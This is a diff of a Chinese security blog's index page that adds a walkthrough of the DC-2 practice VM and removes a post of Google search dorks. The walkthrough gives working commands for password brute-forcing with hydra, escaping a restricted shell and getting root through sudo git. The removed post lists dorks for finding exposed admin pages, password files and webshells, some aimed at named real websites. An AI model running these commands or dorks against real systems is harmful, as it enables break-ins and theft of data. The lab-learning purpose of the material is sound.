@@ -152,6 +152,178 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-DC2靶机渗透记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/14/DC2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">DC2靶机渗透记录</a>
+    </h1>
+  
+
+        
+        <a href="/2021/02/14/DC2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" class="archive-article-date">
+  	<time datetime="2021-02-13T18:12:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <center>DC-2渗透记录</center>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>同样，基本操作，<code>netdiscover</code>发现VMware类型的ip地址，即为目标靶机</p>
+<p><img src="/images/image-20210213024907862.png" alt="image-20210213024907862"></p>
+<p>接下来祭出<code>nmap</code>扫描</p>
+<p><img src="/images/image-20210213025133938.png" alt="image-20210213025133938"></p>
+<p>斯巴拉西，得到了一个重要信息<code>WordPress</code>的站，还有其对应的版本，可以有针对性的利用已知漏洞打击，先存着，先访问其http页面（80端口）得到进一步信息。</p>
+<p>就在页面很轻松能发现第一个flag。</p>
+<p><img src="/images/image-20210213025648878.png" alt="image-20210213025648878"></p>
+<p>flag给了我们提示，需要登录，并且需要<code>cewl</code>而且提示常用wordlists可能并不起作用，所以我们需要有针对性的设计（那不就是社工字典吗QAQ）。我们先<code>dirsearch</code>一波，看能不能跑出来登录框</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://dc-2/ -e* &gt; /home/xxx/DC-2/DC2web.txt</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/images/image-20210213030100762.png" alt="image-20210213030100762"></p>
+<p>信息还是蛮多的，登录窗口也扫出来了（wp的后台管理窗口也就那个名儿。。。），根据flag1提示，查了一下<code>Cewl</code>的使用。<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/190128.html">我是链接</a></p>
+<blockquote>
+<p>Cewl是以爬虫模式在指定URL上收集单词的工具，并将其制作成密码字典，以提高密码破解工具的成功率。</p>
+</blockquote>
+<p>针对该网站生成特定的社工字典结果如下图。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -w DC2-pwd.txt http://dc-2/</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210214002259955.png" alt="image-20210214002259955"></p>
+<p>因为网站是<code>wordpress</code>，所以肯定是<code>wpscan</code>啦。先扫描可用漏洞。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 &gt; dc-2.txt</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>WPScan是一个扫描 WordPress 漏洞的黑盒子扫描器，可以扫描敏感文件、获取站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。</p>
+<p>参数：<br> –url 扫描网站<br> -e 枚举<br> u 枚举用户名，默认从1-10<br> p 枚举插件<br> t 枚举主题信息</p>
+</blockquote>
+<p>接下来枚举用户名信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 -e u</span><br></pre></td></tr></table></figure>
+<p>用户信息处有惊喜，发现了<code>admin</code>，<code>jerry</code>and<code>tom</code>三个账号</p>
+<p><img src="/images/image-20210214003751217.png" alt="image-20210214003751217"></p>
+<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>自然而然的考虑用<code>burpsuite</code>爆破账号密码。。。</p>
+<p><img src="/images/image-20210214011240025.png" alt="image-20210214011240025"></p>
+<p>burp为防止封ip所以速度非常慢，换成hydra，，，参考burp的爆破格式构造：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -t 3 -l tom -P DC2-pwd.txt -o out.txt -f dc-2 http-form-post &#x27;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;testcookie=1:S=location&#x27; </span><br></pre></td></tr></table></figure>
+<p><code>-t 3</code> 控制线程数 无此选项默认12线程，经过测试这个服务端线程开太多会无响应，所以在这里制定为1（大家应该自行尝试最佳线程数）。</p>
+<ul>
+<li><code>-l tom</code> 指定单个用户名“root”。（可替换成<code>-L 字典.txt</code>来指定一系列用户名）</li>
+<li><code>-P DC2-pwd.txt</code> 指定密码字典（可替换成<code>-p 密码</code> 指定单个密码，一般不常用</li>
+<li><code>-o out.txt</code> 将尝试过程与结果保存到out.txt</li>
+<li> <code>-vV</code>显示详细过程</li>
+<li> <code>-f</code> 找到一个结果后停止</li>
+<li> <code>dc-2</code> 目标域名</li>
+<li> <code>http-post-form</code> 使用http协议下的post方法进行破解</li>
+<li><code>/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;testcookie=1:S=location</code>登录位置在目录<code>/wp-login.php</code>处，其余参考burp。</li>
+</ul>
+<p><img src="/images/image-20210214010701970.png" alt="image-20210214010701970"></p>
+<p>这里亲测哈，hydra牛逼！！！</p>
+<p>统计一下，只爆出来了两个</p>
+<ol>
+<li><code>jerry:adipiscing</code></li>
+<li><code>tom:parturient</code></li>
+</ol>
+<p>用我们拿到的账号密码登录上去会发现<code>flag2</code>，考虑了意思后放弃了msf搜索exp，，，因为写的很清楚，如果从版本的漏洞来打，估计需要自己构造。</p>
+<p><img src="/images/image-20210214011455745.png" alt="image-20210214011455745"></p>
+<p>试了试传马getshell，发现有保护，也无法常规绕过。</p>
+<p><img src="/images/image-20210214012228481.png" alt="image-20210214012228481"></p>
+<p>神奇的是，打了一个xss出来，但可惜没什么用，因为这是靶机，admin不会登陆。。。</p>
+<p><img src="/images/image-20210214012725346.png" alt="image-20210214012725346"></p>
+<p>一时间思路断了呜呜呜，，后来检查了一遍nmap信息发现，因为使用的命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.1.11</span><br></pre></td></tr></table></figure>
+<p>这里的端口扫描似乎只会扫前1000个端口！所以万一迁移了什么端口，就会把这重要信息给漏过去！</p>
+<p>重新构造</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.1.11 -p 1-10000</span><br></pre></td></tr></table></figure>
+<p>果然，发现了7744端口的ssh登录</p>
+<p><img src="/images/image-20210214013355889.png" alt="image-20210214013355889"></p>
+<h2 id="连入服务器"><a href="#连入服务器" class="headerlink" title="连入服务器"></a>连入服务器</h2><p>来一波ssh连接。</p>
+<p>试了几次发现，<code>jerry</code>没有这个su，有的是<code>tom</code>的，于是登录tom</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.1.11 -p 7744</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210214013704428.png" alt="image-20210214013704428"></p>
+<p>但是！很无语，受限制的shell。这里给个参考，<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/188989.html">我是链接</a></p>
+<blockquote>
+<p>rbash是Restricted Shell，即受限的shell，它与一般标准shell的区别在于会限制执行一些行为。</p>
+</blockquote>
+<p><img src="/images/image-20210214013803467.png" alt="image-20210214013803467"></p>
+<p>可以手动添加环境来绕过shell限制</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br><span class="line"><span class="meta">$</span><span class="bash"> /bin/bash</span></span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210214014445162.png" alt="image-20210214014445162"></p>
+<p>所以我们要换用<code>su</code>来换shell。</p>
+<p><img src="/images/image-20210214014621562.png" alt="image-20210214014621562"></p>
+<p>这时候再输入上次爆破出来的密码就能换了，但是！权限不够。。。</p>
+<p>随便试了一些命令瞎转，居然又发现了<code>flag.txt</code>XD，而且，嘴上说着没有提示，身体还是挺老实的嘛。<strong>Git</strong></p>
+<p><img src="/images/image-20210214014905308.png" alt="image-20210214014905308"></p>
+<p><img src="/images/image-20210214015026394.png" alt="image-20210214015026394"></p>
+<p>git命令无需root权限即可使用，那就是利用git来进行提权。sudo后，以root身份调用/bin/bash</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210214015519144.png" alt="image-20210214015519144"></p>
+<p><img src="/images/image-20210214015543045.png" alt="image-20210214015543045"></p>
+<p>至此全部结束XD！！！</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>很开心，但还是有点小瑕疵</p>
+<ol>
+<li>CMS的admin账号密码，还没有找到，不知道有什么。</li>
+<li>挺想知道如何利用wp的版本漏洞直接getshell，可惜也没找到</li>
+</ol>
+<p>以上XD</p>
+<p><img src="/images/image-20210214020933513.png" alt="image-20210214020933513"></p>
+<p>喵的，查了一下passwd才发现，这个站似乎没有admin哇？还有那个mysql怎么回事？nonexistent?</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">vulhub</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/02/14/DC2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-数学建模美赛总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1313,156 +1485,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/01/20/Typora%E8%87%AA%E5%AD%A6%E6%95%99%E7%A8%8B/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Google-Hack" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/20/Google-Hack/">Google Hack</a>
-    </h1>
-  
-
-        
-        <a href="/2021/01/20/Google-Hack/" class="archive-article-date">
-  	<time datetime="2021-01-20T12:44:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-20</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <center>Google Hack搜索语句</center>
-
-<h2 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h2><h3 id="1-intitle"><a href="#1-intitle" class="headerlink" title="1.intitle"></a><strong>1.intitle</strong></h3><pre><code>intitle语法常常被用来搜索网站后台、特殊页面和文件，通过在Google中搜索**“intitle:登录”**、**“intitle:管理”**就可以找到很多网站的后台登录页面。此外，intitle语法还可以被用在搜索文件上，例如搜索**“intitle:&quot;indexof&quot;etc/shadow”**就可以找到Linux中因为配置不合理而泄露出来的用户密码文件。</code></pre>
-<h3 id="2-inurl"><a href="#2-inurl" class="headerlink" title="2.inurl"></a><strong>2.inurl</strong></h3><pre><code>作用分为以下两个方面：**寻找网站后台登录地址，搜索特殊URL**。
-
-与intitle不同，inurl可以指定URL的关键字，许多网站后台URL都是类似“login.asp”，“admin.asp”结尾，所以eg:**“inurl:login.asp”**，**“inurl:admin.asp”**即可，同时，可以搜索网站数据库地址，以**“inurl:data”**，**“inurl:db”**为关键字进行搜索即可。
-
-比如前段日子很火的上传漏洞，我们使用**“inurl:upload.asp”**或**“inurl:upload_soft.asp”**即可找到很多上传页面，此时再用工具进行木马上传就可以完成入侵。</code></pre>
-<h3 id="3-intext"><a href="#3-intext" class="headerlink" title="3.intext"></a><strong>3.intext</strong></h3><pre><code>intext的作用是搜索网页中的指定字符，这貌似在Google Hack中没有什么作用，不过在以**“intext:to parent directory”**为关键字进行搜索后，我们会很惊奇的发现，无数网站的目录暴露在我们眼前。我们可以在其中随意切换目录，浏览文件，就像拥有了一个简单的Webshell。形成这种现象的原因是由于IIS的配置疏忽。同样，中文IIS配置疏忽也可能出现类似的漏洞，我们用**“intext:转到父目录”**就可以找到很多有漏洞的中文网站。</code></pre>
-<h3 id="4-Filetype"><a href="#4-Filetype" class="headerlink" title="4.Filetype"></a><strong>4.Filetype</strong></h3><pre><code> Filetype的作用是搜索指定文件。假如我们要搜索网站的数据库文件，那么可以以**“filetype:mdb”**为关键字进行搜索，很快就可以下载到不少网站的数据库文件。</code></pre>
-<h3 id="5-site"><a href="#5-site" class="headerlink" title="5.site"></a><strong>5.site</strong></h3><pre><code>Site语法可以显示所有和目标网站有联系的页面，从中或多或少存在一些关于目标网站的资料.</code></pre>
-<h2 id="组合语句"><a href="#组合语句" class="headerlink" title="组合语句"></a>组合语句</h2><h3 id="1-网站数据库"><a href="#1-网站数据库" class="headerlink" title="1.网站数据库"></a><strong>1.网站数据库</strong></h3><pre><code>**“Site:目标网站&quot;**获取相关网页，之后搜索**“Site:目标网站 Filetype:mdb”**就可以寻找目标网站的数据库，其中的Site语法限定搜索范围，Filetype决定搜索目标。用这种方法有一个缺点，就是下载到数据库的成功率较低。在这里我们还可以采用另一种语法组合，前提是目标网站存在**IIS配置缺陷**，即可以随意浏览站点文件夹，我们搜索**“Site:目标网站 intext:to parent directory”**来确定其是否存在此漏洞。在确定漏洞存在后，可以使用**“Site:目标网站 intext:to parent directory+intext.mdb”**进行数据库的搜索。</code></pre>
-<h3 id="2-登陆后台管理"><a href="#2-登陆后台管理" class="headerlink" title="2.登陆后台管理"></a>2.<strong>登陆后台管理</strong></h3><pre><code>下载到数据库后，我们就可以从中找到网站的管理员帐户和密码，并登录网站的后台。对于网站后台的查找，可以使用语法组合**“Site:目标网站 intitle:管理”**或者**“Site:目标网站 inurl:login.asp”**进行搜索，当然我们可以在这里进行联想，以不同的字符进行搜索，这样就有很大的概率可以找到网站的后台管理地址。接下去黑客就可以在后台上传Webshll，进一步提升权限，在此不再阐述。</code></pre>
-<h2 id="google黑客搜索语法小结（适于新手）"><a href="#google黑客搜索语法小结（适于新手）" class="headerlink" title="google黑客搜索语法小结（适于新手）"></a>google黑客搜索语法小结（适于新手）</h2><h3 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h3><p>intext:关键字 把网页正文内某个关键字作为搜索条件 </p>
-<hr>
-<p> intitle:关键字 把网页标题内某个关键字作为搜索条件 </p>
-<hr>
-<p>inurl:关键字 搜索含有关键字的url地址 </p>
-<hr>
-<p>link:关键字 查找与关键字做了链接的url地址 </p>
-<hr>
-<p>site:域名 返回域名中所有url地址 </p>
-<hr>
-<p>filetype:文件名.后缀名 搜索特定的文件</p>
-<hr>
-<p>*以上是比较有用的几个语法  </p>
-<h3 id="用法例子："><a href="#用法例子：" class="headerlink" title="用法例子："></a>用法例子：</h3><p>一：搜索注入漏洞站点 inurl:asp?id=          配合啊D使用 </p>
-<p>二：查找特定网站的注入漏洞 如要找搜狐的注入 site:sohu.com inurl:asp?id= 要是找php站的注入只要把asp换成php  </p>
-<p>三：对目标网站的搜索利用 找特定网站管理页面 </p>
-<p>site:网址 intext:管理  </p>
-<p>site:网址 inurl:login(登陆的页面) </p>
-<p>site:网址 intitle:管理  </p>
-<p>查看有无上传页面漏洞：</p>
-<p> site:网址 inurl:file </p>
-<p>site:网址 inurl:load </p>
-<p>四：搜别人留下的webshell </p>
-<p>如输入：绝对路径 输入保存的路径 输入文件的内容 inurl:diy.asp </p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.hybx.net/">http://www.hybx.net</a> intext</p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.hybx.net/">http://www.hybx.net</a> intext:管理  </p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.hybx.net/">http://www.hybx.net</a> inurl:login </p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.hybx.net/">http://www.hybx.net</a> intitle:管理 </p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.hybx.net/">http://www.hybx.net</a> inurl:login.asp </p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.hybx.netindex.asp/">http://www.hybx.netindex.asp</a> inurl:asp?id= </p>
-<p>六．网站的目录结构搜索</p>
-<p>Parent directory site：baidu.com</p>
-<p>七.黑客常用的语法</p>
-<p>admin site:edu.cn</p>
-<p>site:sunghsot.cn intext:管理|后台|登录|用户名|密码|验证码|系统|账号|后台管理|后台登录</p>
-<p>site:sunghsot.cn intitle:管理|后台|登录|用户名|密码|验证码|系统|账号|后台管理|后台登录</p>
-<p>inurl:login/admin/manage/admin_login/login_admin/system/boos/master/main/cms/wp-admin/sys|managetem|password|username</p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.sunghost.cn/">www.sunghost.cn</a> inurl:file</p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.sunghost.cn/">www.sunghost.cn</a> inurl:load</p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.sunghost.cn/">www.sunghost.cn</a> inurl:php?id=</p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.sunghost.cn/">www.sunghost.cn</a> inurl:asp?id=</p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.sunghost.cn/">www.sunghost.cn</a> inurl:fck</p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.sunghost.cn/">www.sunghost.cn</a> inurl:ewebeditor</p>
-<p>inurl:ewebeditor|editor|uploadfile|eweb|edit</p>
-<p>intext:to parent directory</p>
-<p>intext:转到父目录/转到父路径</p>
-<p>inurl:upload.asp</p>
-<p>inurl:cms/data/templates/images/index/</p>
-<p>intitle:powered by dedecms</p>
-<p>index of/ppt</p>
-<p>Filetype:mdb</p>
-<p>site:<a target="_blank" rel="noopener" href="http://www.sunghost.cn/">www.sunghost.cn</a> intext:to parent directory+intext.mdb</p>
-<p>inurl:robots.txt</p>
-<p>intitle:index.of “parent directory” </p>
-<p>留意几种文件：</p>
-<ol>
-<li><p>.inc   可能包含网站的配置信息，如数据库用户名、密码等。</p>
-</li>
-<li><p>.bak   通常是一些文本编辑器在编辑源代码后留下的备份文件，可以让你知道与其对应的程序脚本文件中的大致内容。</p>
-</li>
-<li><p>.txt或 .sql  一般包含网站运行的sql脚本可能会透露类似数据库结构等信息。</p>
-<p>特别注意名字为robots.txt的文件。</p>
-</li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Google Hack</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/20/Google-Hack/">展开全文 >></a>
         </p>
       
 
